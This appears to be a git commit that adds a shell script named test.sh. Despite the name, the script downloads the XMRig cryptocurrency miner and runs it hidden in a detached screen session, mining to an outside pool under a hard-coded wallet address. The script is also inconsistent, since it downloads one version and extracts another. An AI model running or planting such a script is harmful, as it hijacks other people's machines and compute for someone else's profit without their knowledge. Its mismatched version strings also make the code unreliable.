72e1d72f19329ab6900a3c6dbff8a597bfa9a678
stciali <74396518+stciali@users.noreply.github.com>
2022-06-28 23:24:20 +0300

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar -xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BVdAKt5opzf6tDqAzyZqgb87VXdvKnwchV.as-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 4
